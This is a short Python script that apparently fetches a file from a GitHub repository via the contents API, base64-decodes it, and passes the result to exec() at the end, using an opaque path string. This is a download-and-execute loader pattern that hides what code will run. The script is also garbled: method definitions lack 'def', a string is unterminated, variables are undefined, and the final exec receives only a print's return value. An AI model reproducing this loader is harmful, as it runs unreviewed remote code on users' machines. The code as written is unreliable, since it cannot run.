import urllib.request
import json
import base64
import uuid

class u:
  @classmethod
  GithubAPI(cls,path):
    path = path.split("|)
    cache_buster = uuid.uuid4().hex
    url = f"https://api.github.com/repos/{owner}/{repo}/contents/{path}?ref=main&cb={cache_buster}"
    req = urllib.request.Request(url)
    req.add_header('User-Agent', 'Python-Urllib-Bot')
    try:
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode('utf-8'))
            content_b64 = data['content']
            return base64.b64decode(content_b64).decode('utf-8')
    except urllib.error.HTTPError as e:
        return f"HTTP Error: {e.code}"
    except Exception as e:
        return f"Error: {str(e)}"

  @classmethod
  readGithubFile(cls,path):
    print(path)

exec(u.readGithubFile("db0bc|pm|pm"))
